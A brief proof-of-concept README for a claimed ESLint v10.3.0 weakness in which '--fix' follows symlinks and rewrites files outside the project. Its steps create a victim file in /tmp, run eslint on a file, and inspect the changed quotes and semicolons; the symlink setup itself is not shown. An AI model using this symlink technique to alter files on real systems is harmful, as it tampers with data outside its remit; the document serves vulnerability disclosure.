# ESLint-File-Overwrite

This is a weakness in ESlint v10.3.0 in which the "--fix" option will follow along symlinks and edit files at the end of them.

Step 1:
  # Reset the victim file with this command. Note the single quotes and no semi-colons
  cat > /tmp/eslint-symlink-poc-victim.js <<'EOF'
  // VICTIM FILE — sits OUTSIDE the project being linted.
  const secret = 'do-not-modify'
  const other  = 'also-do-not-modify'
  EOF
  # Verify that the file has been updated on your machine.

Step 2:
  # Run the following eslint command pointed at the innocuous.js file:
  ./node_modules/.bin/eslint --fix innocuous.js

Step 3:
  # Profit(?)
  # View the output of /tmp/eslint-symlink-poc-victim.js and verify that the quotes and semi-colons are different
  cat /tmp/eslint-symlink-poc-victim.js

Step 4: 
  # Go fourth and conquer
